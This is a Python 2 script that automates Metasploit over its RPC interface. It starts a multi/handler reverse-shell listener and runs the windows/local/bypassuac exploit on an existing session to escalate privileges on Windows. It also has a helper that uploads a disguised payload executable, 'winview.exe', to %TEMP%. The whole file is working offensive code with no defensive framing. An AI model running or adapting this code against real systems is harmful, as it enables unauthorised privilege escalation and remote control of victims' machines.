from metasploit.msfrpc import MsfRpcClient
import os
import time
import anssi.settings

def exploit(session_id, session, shell, modules):
    
    launch_listener(session, modules)
    #return True
    #uploaded = upload_payload(shell)
    #if not uploaded:
    #    return False

    #return True
    exploit = modules.use('exploit', 'windows/local/bypassuac')
    exploit.target = 1
    print exploit.target
    print dir(exploit)
    print exploit.required
    pl = modules.use('payload', session['via_payload'].replace('payload/', ''))
    tunnel = session['tunnel_local'].split(':')
    pl['LPORT'] = tunnel[1]
    pl['LHOST'] = tunnel[0]

    exploit['SESSION'] = session_id
    #exploit['EXE::Custom'] = 'winview.exe'
    #exploit['EXE::Path'] = '%TEMP%'
    #exploit['DisablePayloadHandler'] = True
    print exploit
    print exploit.execute(payload=pl)
    


def upload_payload(shell):
    file_path = os.path.join(anssi.settings.MEDIA_ROOT, 'payload', 'winview.exe')
    shell.write('upload "' + file_path + '" %TEMP%')
    ret = shell.read()

    succeed = False
    while not "uploaded" in ret and not "Operation failed" in ret:
        time.sleep(0.1)
        ret = shell.read()

    if "uploaded" in ret:
        succeed = True

    return succeed


def launch_listener(session, modules):
	exploit = modules.use('exploit', 'multi/handler')
        pl = modules.use('payload', session['via_payload'].replace('payload/', ''))
        tunnel = session['tunnel_local'].split(':')
        pl['LPORT'] = tunnel[1]
        pl['LHOST'] = tunnel[0]
        pl['EXITFUNC'] = 'thread'

        exploit.execute(payload=pl)



